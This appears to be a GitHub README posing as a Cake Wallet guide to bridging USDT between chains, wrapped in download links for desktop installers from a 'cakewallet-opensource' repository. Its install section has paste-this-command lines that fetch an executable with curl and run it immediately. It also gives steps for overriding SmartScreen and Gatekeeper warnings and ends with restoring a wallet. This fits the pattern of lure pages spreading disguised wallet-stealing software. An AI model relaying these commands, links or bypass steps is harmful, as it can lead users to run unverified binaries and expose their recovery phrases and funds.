![Cake Wallet usdt bridge guide](assets/cake-wallet-usdt-bridge-article-banner.png)

# Bridge USDT Between Chains in Cake Wallet

A bridge is not a swap, and the destination token may arrive invisible.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

Open the bridge flow, choose the source and destination chains for USDT, and confirm the route it offers. A bridge moves the same asset across chains while a swap changes the asset, and the bridged token often needs adding by contract address before the balance appears on the destination chain.

<!-- ARTICLE-BODY-BEGIN -->

## Bridge vs swap
A swap trades one asset for another on one chain; a bridge moves an asset from one chain to another. Both have fees and both have failure states, but only the bridge leaves you holding the same USDT on a different network.

That is why a bridged balance that does not appear is usually a display problem, not a lost transfer. The token exists on the destination chain; the wallet simply has not been told to show that contract.

## Which networks are involved
USDT exists separately on several chains, and each version is a different token with a different contract. Bridging Tron USDT to Ethereum USDT means the destination is the Ethereum contract, not a renamed copy of the original.

<a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-supported-coins-networks.md">Cake Wallet networks</a> lists which chains are supported, and whether the token appears by default or needs adding.

## Seeing the bridged token
If the destination balance shows nothing, add the token by its contract address on the destination network. Once the contract is right the balance appears immediately, because the funds were there all along.

<a href="https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-custom-tokens.md">Add custom tokens in Cake Wallet</a> walks through the contract field and the network selector, which is also where most "my tokens vanished" cases resolve.

## Costs and timing
A bridge charges its own fee plus the network fee on each side, and it takes longer than a swap because two chains are involved. Confirmations on the destination chain are the part you wait for.

Sending a small test amount first is cheap insurance on a route you have not used. It costs one extra fee and removes the possibility of losing a large transfer to a mistyped chain.

## The swap alternative
If the goal is simply to hold a different coin rather than the same coin elsewhere, a swap is simpler and better supported. It happens inside the wallet with a provider quote, and it has one leg rather than two.

<a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-swap-crypto.md">Swap crypto in Cake Wallet</a> covers quotes and rate types, including the fixed-rate option when the exact amount matters.

## Current build
Bridge support depends on the build and on the integration behind it. Install the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">current Cake Wallet release</a> and check the flow before you assume the route you want is unavailable.

The desktop build on this page is older than parts of the current multi-chain work, so treat the bridge as a feature to verify rather than assume.

## FAQ
### How do I bridge USDT between chains?
Use the bridge flow, pick the source and destination networks, and confirm the route. Add the destination token if the balance does not show.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[swap crypto in Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-swap-crypto.md) · [add custom tokens in Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-custom-tokens.md) · [Cake Wallet networks](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-supported-coins-networks.md) · [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
